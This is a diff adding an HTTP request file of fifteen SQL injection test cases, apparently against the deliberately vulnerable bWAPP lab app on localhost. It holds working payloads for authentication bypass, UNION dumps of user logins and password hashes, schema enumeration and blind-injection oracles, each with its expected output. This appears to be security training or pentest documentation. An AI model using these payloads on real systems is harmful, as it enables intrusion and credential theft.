@@ -1,0 +1,199 @@
+### ============================================================================
+### 01 - A1 Injection / SQL Injection
+###   Target: MySQL 5.5 (ext/mysql + mysqli), PHP 5.5, no prepared statements
+###   Vulnerable sinks (app source, /app):
+###     sqli_1.php   SELECT * FROM movies WHERE title LIKE '%<title>%'   GET  "title"
+###     sqli_2.php   SELECT * FROM movies WHERE id = <movie>             GET  "movie"  (unquoted int!)
+###     sqli_3.php   SELECT * FROM heroes WHERE login='<login>' AND ...  POST "login"/"password"
+###     sqli_4.php   boolean blind: SELECT * FROM movies WHERE title='<title>'
+###     sqli_6.php   POST LIKE search
+###     sqli_7.php   INSERT INTO blog (...) VALUES (now(),'<entry>','<owner>')
+###     sqli_10-2.php GET LIKE, returns text/json
+###     sqli_16.php  SELECT * FROM users WHERE login='<login>'   (login form)
+###     xxe-2.php    UPDATE users SET secret='<secret>' WHERE login='<login>'
+###
+###   Column order of the `movies` table (what the UI prints):
+###     title | release_year | main_character | genre | imdb
+###   (schema order is id,title,release_year,genre,main_character,imdb -
+###    the template swaps genre and main_character when rendering)
+### ============================================================================
+
+### ---------------------------------------------------------------------------
+### SQLI-01  Boolean: dump every movie
+###   Payload: ' OR 1=1-- -
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/sqli_1.php?title=%27%20OR%201%3D1--%20-&action=go HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, all 9 movies listed (G.I. Joe ... World War Z)
+###   URL-decoded: /sqli_1.php?title=' OR 1=1-- -&action=go
+
+
+### ---------------------------------------------------------------------------
+### SQLI-02  UNION: determine the column count
+###   1,2,3,4,5,6 -> works.  7 columns -> "The used SELECT statements have a
+###   different number of columns". That error message is the enumeration oracle.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/sqli_1.php?title=%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6--%20-&action=go HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, an extra row rendered from our SELECT
+
+
+### ---------------------------------------------------------------------------
+### SQLI-03  UNION dump of the `users` table (full credential exfiltration)
+###   The sink is `WHERE id = <movie>` with NO quotes, so start the id at 0
+###   to avoid a matching movie row shadowing the injected one.
+###   GROUP_CONCAT is required: sqli_2.php only renders mysql_fetch_array()'s
+###   FIRST row, so a plain UNION would only ever show users.id = 1.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/sqli_2.php?movie=0%20UNION%20SELECT%201%2CGROUP_CONCAT(login)%2CGROUP_CONCAT(password)%2C4%2C5%2C6%20FROM%20users--%20-&action=go HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, Title column = "A.I.M.,bee"
+###           Release column = "6885858486f31043e5839c735d99457f045affd0,688585..."
+###           (that is SHA1("bug") twice - both accounts share the default password)
+
+
+### ---------------------------------------------------------------------------
+### SQLI-04  Error/context based: leak the current database name
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/sqli_2.php?movie=0%20UNION%20SELECT%201%2Cdatabase()%2C3%2C4%2C5%2C6--%20-&action=go HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, Title column = "bWAPP"
+
+
+### ---------------------------------------------------------------------------
+### SQLI-05  Enumerate the schema from information_schema
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/sqli_2.php?movie=0%20UNION%20SELECT%201%2CGROUP_CONCAT(table_name)%2C3%2C4%2C5%2C6%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()--%20-&action=go HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, Title column contains "blog,heroes,movies,users"
+
+
+### ---------------------------------------------------------------------------
+### SQLI-06  Boolean blind (sqli_4.php) - TRUE branch
+###   sqli_4.php only answers "The movie exists in our database!" / "does not
+###   exist", which is a clean boolean oracle for a scripted extractor.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/sqli_4.php?title=%27%20OR%20%271%27%3D%271&action=search HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, body contains "The movie exists in our database!"
+
+
+### ---------------------------------------------------------------------------
+### SQLI-07  Boolean blind - FALSE branch (control, proves the oracle is real)
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/sqli_4.php?title=%27%20OR%20%271%27%3D%270&action=search HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, body contains "The movie does not exist in our database!"
+
+
+### ---------------------------------------------------------------------------
+### SQLI-08  POST LIKE search (sqli_6.php)
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/sqli_6.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+title=%27%20OR%201%3D1--%20-&form=submit
+### Expected: 200, all movies returned
+
+
+### ---------------------------------------------------------------------------
+### SQLI-09  Login-form bypass against `heroes` (sqli_3.php)
+###   LIMIT 1 matters: the page renders one row, and we want the first.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/sqli_3.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+login=%27%20OR%201%3D1%20LIMIT%201--%20-&password=x&form=submit
+### Expected: 200, secret of hero id 1 (neo): "Oh why didn't I took that BLACK pill?"
+
+
+### ---------------------------------------------------------------------------
+### SQLI-10  Login-form bypass against `users` (sqli_16.php)
+###   Bypasses authentication AND discloses the session's secret value.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/sqli_16.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+login=%27%20OR%201%3D1%20LIMIT%201--%20-&password=x&form=submit
+### Expected: 200, "Welcome ..." in the menu bar - logged in as A.I.M. without a password
+
+
+### ---------------------------------------------------------------------------
+### SQLI-11  AJAX / JSON endpoint (sqli_10-2.php)
+###   Same UNION, but the response is text/json - a different content-type
+###   sink, so filters that only look at HTML can miss it.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/sqli_10-2.php?title=%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6--%20- HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200 Content-Type: text/json, keys title/release_year/main_character/genre/imdb
+
+
+### ---------------------------------------------------------------------------
+### SQLI-12  Stacked / subquery injection in the blog INSERT (sqli_7.php)
+###   The entry is concatenated into an INSERT; the subquery replaces owner.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/sqli_7.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+entry=x%27%2C(SELECT%20login%20FROM%20users%20LIMIT%201)%2C%272024-01-01%27%2C%27bee%27)%3B--%20-&blog=submit&entry_add=on&entry_all=on&form=submit
+### Expected: 200, the blog listing shows the injected owner value
+
+
+### ---------------------------------------------------------------------------
+### SQLI-13  SQL injection over the XML AJAX endpoint (sqli_8-2.php)
+###   This is the bWAPP "SQLi AJAX/JSON/jQuery" bug: a JS button POSTs XML to
+###   sqli_8-2.php, which runs UPDATE users SET secret='<secret>' WHERE login='<login>'.
+###   Reproduce the exact request the browser makes.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/sqli_8-2.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: text/xml; charset=UTF-8
+
+<reset><login>bee</login><secret>Any bugs?</secret></reset>
+### Expected: 200, "bee's secret has been reset!" - your session secret is now attacker-chosen
+
+
+### ---------------------------------------------------------------------------
+### SQLI-14  Boolean SQLi in the WHERE clause of that XML endpoint
+###   A trailing quote alone breaks the statement (see 05-xxe.http XXI-03);
+###   this is the working, non-erroring boolean form.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/sqli_8-2.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: text/xml; charset=UTF-8
+
+<reset><login>bee' AND 1=1-- -</login><secret>x</secret></reset>
+### Expected: 200, "bee's secret has been reset!"
+
+
+### ---------------------------------------------------------------------------
+### SQLI-15  Authentication bypass on the REAL login form (login.php)
+###   login.php escapes input with mysqli_real_escape_string and hashes with
+###   SHA1, so plain OR-based SQLi fails here. This documents the negative
+###   result so the report does not overstate the finding:
+###   login.php is the one login form that is NOT injectable.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/login.php HTTP/1.1
+Host: localhost:8080
+Content-Type: application/x-www-form-urlencoded
+
+login=bee%27%20OR%20%271%27%3D%271&password=x&security_level=0&form=submit
+### Expected: 200 with "Failed to login" - injection is correctly neutralised here
